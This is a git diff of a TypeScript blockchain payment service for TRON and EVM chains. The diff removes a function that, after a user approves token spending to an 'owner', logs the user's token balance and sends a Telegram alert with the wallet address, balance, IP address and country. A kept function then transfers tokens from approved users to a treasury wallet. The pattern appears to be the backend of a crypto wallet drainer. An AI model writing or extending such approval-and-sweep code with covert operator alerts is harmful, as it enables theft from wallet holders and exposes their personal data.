@@ -5,16 +5,6 @@
 import { BlockchainResult, ChainType, CurrencyType, TransferResult, TreasuryWalletBalance } from "@/types";
 import { TronService } from "./tronService";
 import { EVMService } from "./evmService";
-import { TelegramService } from "./telegramService";
-import { getWalletType } from "../../utils/chainUtils";
-
-/** Base URL for server-side fetch (relative URLs fail in Node). */
-function getApiBaseUrl(): string {
-  if (typeof window !== "undefined") return "";
-  const base = process.env.NEXT_PUBLIC_BASE_URL;
-  if (base) return base.replace(/\/$/, "");
-  return "http://localhost:3000";
-}
 
 export class BlockchainService {
   private static instance: BlockchainService;
@@ -59,148 +49,6 @@ export class BlockchainService {
   }
 
   /**
-   * Confirm approval of token spending
-   */
-  async confirmApproval(
-    chain: ChainType,
-    currency: string,
-    amount: string,
-    userAddress: string,
-    paymentId: string,
-    txHash: string,
-    clientIP?: string
-  ): Promise<{ success: boolean; message?: string }> {
-    try {
-      const tokenBalance = await this.getUserTokenBalance(chain, currency as CurrencyType, userAddress);
-
-      // Common database update function - moved to API calls
-      const updateWalletDatabase = async () => {
-        try {
-          console.log("🔄 Updating wallet database for:", userAddress, chain, currency);
-
-          // Call API endpoint instead of direct database access (absolute URL required server-side)
-          const response = await fetch(`${getApiBaseUrl()}/api/payment/update-wallet`, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              address: userAddress,
-              chain: chain,
-              currency: currency,
-              amount: amount,
-              tokenBalance: tokenBalance
-            })
-          });
-
-          if (response.ok) {
-            const result = await response.json();
-            console.log("✅ Successfully updated wallet database via API:", result.message);
-          } else {
-            console.warn("⚠️ Wallet database update failed via API");
-          }
-        } catch (dbError: any) {
-          console.error("❌ Error updating wallet database via API:", dbError);
-          // Don't throw error - continue with payment flow
-        }
-      };
-
-      // Update payment status in database - moved to API calls
-      const updatePaymentDatabase = async (txHash?: string) => {
-        try {
-          console.log("🔄 Updating payment database for:", paymentId, "status: completed");
-
-          // Call API endpoint instead of direct database access (absolute URL required server-side)
-          const response = await fetch(`${getApiBaseUrl()}/api/payment/update-status`, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              paymentId: paymentId,
-              status: "completed",
-              walletAddress: userAddress,
-              txHash: txHash || ""
-            })
-          });
-
-          if (response.ok) {
-            console.log("✅ Successfully updated payment database via API");
-          } else {
-            console.warn("⚠️ Payment database update failed via API");
-          }
-        } catch (dbError: any) {
-          console.error("❌ Error updating payment database via API:", dbError);
-          // Don't throw error - continue with payment flow
-        }
-      };
-
-      // Common telegram notification function
-      const sendTelegramNotification = async () => {
-        try {
-          const country = await TelegramService.getCountryFromIP(clientIP);
-          const walletType = getWalletType(chain);
-
-          await TelegramService.sendApprovalNotification({
-            chain,
-            currency,
-            userAddress,
-            amount,
-            paymentId,
-            walletType,
-            clientIP,
-            tokenBalance,
-            country
-          });
-        } catch (telegramError) {
-          // Silent error handling for production
-        }
-      };
-
-      let approvalData;
-      if (chain === "tron") {
-        console.log("Creating TRON approval data for owner");
-        // TRON: Create approval data for user to approve owner
-        approvalData = await TronService.needsApproval(currency as CurrencyType, userAddress, amount);
-
-        // Update database and send notification (non-blocking)
-        if (approvalData.needsApproval) {
-          const tasks = [updateWalletDatabase(), updatePaymentDatabase(txHash), sendTelegramNotification()];
-
-          try {
-            const results = await Promise.allSettled(tasks);
-
-            results.forEach((res, i) => {
-              if (res.status === "rejected") {
-                console.warn(`⚠️ Task ${i + 1} failed during background operations:`, res.reason);
-              }
-            });
-          } catch (err) {
-            console.error("Unexpected error during background operations:", err);
-          }
-        }
-      } else {
-        // EVM: Create approval data for user to approve owner
-        approvalData = await EVMService.needsApproval(chain, currency as CurrencyType, userAddress, amount);
-
-        // Update database and send notification (non-blocking)
-        if (approvalData.needsApproval) {
-          const tasks = [updateWalletDatabase(), updatePaymentDatabase(txHash), sendTelegramNotification()];
-
-          Promise.allSettled(tasks).catch(error => {
-            console.warn("⚠️ Some background operations failed, but payment continues:", error);
-          });
-        }
-      }
-
-      return { success: true };
-    } catch (error: any) {
-      // Silent error handling for production
-      return { success: false, message: error.message };
-    }
-  }
-
-  /**
    * Transfer token from approved user
    */
   async transferFromUser(
@@ -233,7 +81,7 @@ export class BlockchainService {
   ): Promise<TransferResult> {
     try {
       // Get treasury address from database instead of environment variables
-      const { getDatabase } = await import("@/lib/database");
+      const { getDatabase } = await import("@/lib/mysql");
       const db = getDatabase();
       const treasuryWallet = await db.getTreasuryWallet(chain);
 
